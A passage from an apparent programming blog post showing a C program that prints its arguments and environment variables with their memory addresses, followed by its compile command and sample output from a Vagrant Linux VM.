</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>argc</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>argv[%1$d] =[ %2$p ]==&gt; %2$s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Prints all the environment variables passed to executable
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Environment list :</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>envp</span><span class=p>[</span><span class=n>i</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>envp[%1$d] =[ %2$p ]==&gt; %2$s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>envp</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The above code will print out the argc, argv and envp values to the standard output.</p><p><strong>Compile it</strong> : <code>gcc not_hello_world.c -o not_hello_world.o</code></p><p><strong>Check file type</strong> : <code>file not_hello_world.o</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>not_hello_world.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82cad832f6d9b9a2d071be6bca3ccab87c8c71f6, for GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div><p><strong>Run it</strong> : <code>./not_hello_world.o 12345 123 12345678901234567890 1234</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>Argument</span> <span class=n>count</span> <span class=p>:</span>  <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=n>Arguments</span> <span class=n>list</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd9370c</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=o>./</span><span class=n>not_hello_world</span><span class=o>.</span><span class=n>o</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93720</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=mi>12345</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93726</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=mi>123</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd9372a</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=mi>12345678901234567890</span>
</span></span><span class=line><span class=cl>	<span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd9373f</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=mi>1234</span>
</span></span><span class=line><span class=cl><span class=ne>Environment</span> <span class=n>list</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93744</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>SHELL</span><span class=o>=/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93754</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>LANGUAGE</span><span class=o>=</span><span class=n>en_US</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93764</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>PWD</span><span class=o>=/</span><span class=n>home</span><span class=o>/</span><span class=n>vagrant</span><span class=o>/</span><span class=n>workspace</span><span class=o>/</span><span class=n>blog_junk</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd9378a</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>LOGNAME</span><span class=o>=</span><span class=n>vagrant</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd9379a</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>XDG_SESSION_TYPE</span><span class=o>=</span><span class=n>tty</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd937af</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>MOTD_SHOWN</span><span class=o>=</span><span class=n>pam</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd937be</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>HOME</span><span class=o>=/</span><span class=n>home</span><span class=o>/</span><span class=n>vagrant</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd937d1</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>LANG</span><span class=o>=</span><span class=n>en_US</span><span class=o>.</span><span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd937e2</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>LS_COLORS</span><span class=o>=</span><span class=n>rs</span><span class=o>=</span><span class=mi>0</span><span class=p>:</span><span class=n>di</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>34</span><span class=p>:</span><span class=n>ln</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=n>mh</span><span class=o>=</span><span class=mi>00</span><span class=p>:</span><span class=n>pi</span><span class=o>=</span><span class=mi>40</span><span class=p>;</span><span class=mi>33</span><span class=p>:</span><span class=n>so</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=k>do</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=n>bd</span><span class=o>=</span><span class=mi>40</span><span class=p>;</span><span class=mi>33</span><span class=p>;</span><span class=mi>01</span><span class=p>:</span><span class=n>cd</span><span class=o>=</span><span class=mi>40</span><span class=p>;</span><span class=mi>33</span><span class=p>;</span><span class=mi>01</span><span class=p>:</span><span class=ow>or</span><span class=o>=</span><span class=mi>40</span><span class=p>;</span><span class=mi>31</span><span class=p>;</span><span class=mi>01</span><span class=p>:</span><span class=n>mi</span><span class=o>=</span><span class=mi>00</span><span class=p>:</span><span class=n>su</span><span class=o>=</span><span class=mi>37</span><span class=p>;</span><span class=mi>41</span><span class=p>:</span><span class=n>sg</span><span class=o>=</span><span class=mi>30</span><span class=p>;</span><span class=mi>43</span><span class=p>:</span><span class=n>ca</span><span class=o>=</span><span class=mi>30</span><span class=p>;</span><span class=mi>41</span><span class=p>:</span><span class=n>tw</span><span class=o>=</span><span class=mi>30</span><span class=p>;</span><span class=mi>42</span><span class=p>:</span><span class=n>ow</span><span class=o>=</span><span class=mi>34</span><span class=p>;</span><span class=mi>42</span><span class=p>:</span><span class=n>st</span><span class=o>=</span><span class=mi>37</span><span class=p>;</span><span class=mi>44</span><span class=p>:</span><span class=n>ex</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>32</span><span class=p>:</span><span class=o>*.</span><span class=n>tar</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tgz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>arc</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>arj</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>taz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lha</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lz4</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lzh</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lzma</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tlz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>txz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tzo</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>t7z</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>zip</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>z</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>dz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>gz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lrz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>lzo</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>xz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>zst</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tzst</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>bz2</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>bz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tbz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tbz2</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>tz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>deb</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>rpm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>jar</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>war</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>ear</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>sar</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>rar</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>alz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>ace</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>zoo</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>cpio</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=mi>7</span><span class=n>z</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>rz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>cab</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>wim</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>swm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>dwm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>esd</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>31</span><span class=p>:</span><span class=o>*.</span><span class=n>jpg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>jpeg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mjpg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mjpeg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>gif</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>bmp</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>pbm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>pgm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>ppm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>tga</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>xbm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>xpm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>tif</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>tiff</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>png</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>svg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>svgz</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mng</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>pcx</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mov</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mpg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mpeg</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>m2v</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mkv</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>webm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>ogm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mp4</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>m4v</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>mp4v</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>vob</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>qt</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>nuv</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>wmv</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>asf</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>rm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>rmvb</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>flc</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>avi</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>fli</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>flv</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>gl</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>dl</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>xcf</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>xwd</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>yuv</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>cgm</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>emf</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>ogv</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>ogx</span><span class=o>=</span><span class=mi>01</span><span class=p>;</span><span class=mi>35</span><span class=p>:</span><span class=o>*.</span><span class=n>aac</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>au</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>flac</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>m4a</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>mid</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>midi</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>mka</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>mp3</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>mpc</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>ogg</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>ra</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>wav</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>oga</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>opus</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>spx</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span><span class=o>*.</span><span class=n>xspf</span><span class=o>=</span><span class=mi>00</span><span class=p>;</span><span class=mi>36</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93dc4</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>SSH_CONNECTION</span><span class=o>=</span><span class=mf>10.0</span><span class=o>.</span><span class=mf>2.2</span> <span class=mi>34954</span> <span class=mf>10.0</span><span class=o>.</span><span class=mf>2.15</span> <span class=mi>22</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93def</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>LESSCLOSE</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>lesspipe</span> <span class=o>%</span><span class=n>s</span> <span class=o>%</span><span class=n>s</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e11</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>XDG_SESSION_CLASS</span><span class=o>=</span><span class=n>user</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e28</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>TERM</span><span class=o>=</span><span class=n>tmux</span><span class=o>-</span><span class=mi>256</span><span class=n>color</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e3b</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>LESSOPEN</span><span class=o>=|</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>lesspipe</span> <span class=o>%</span><span class=n>s</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e5b</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>USER</span><span class=o>=</span><span class=n>vagrant</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e68</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>SHLVL</span><span class=o>=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e70</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>XDG_SESSION_ID</span><span class=o>=</span><span class=mi>6</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93e81</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>XDG_RUNTIME_DIR</span><span class=o>=/</span><span class=n>run</span><span class=o>/</span><span class=n>user</span><span class=o>/</span><span class=mi>1000</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93ea0</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>SSH_CLIENT</span><span class=o>=</span><span class=mf>10.0</span><span class=o>.</span><span class=mf>2.2</span> <span class=mi>34954</span> <span class=mi>22</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93ebd</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>XDG_DATA_DIRS</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>share</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>snapd</span><span class=o>/</span><span class=n>desktop</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93efe</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>PATH</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span 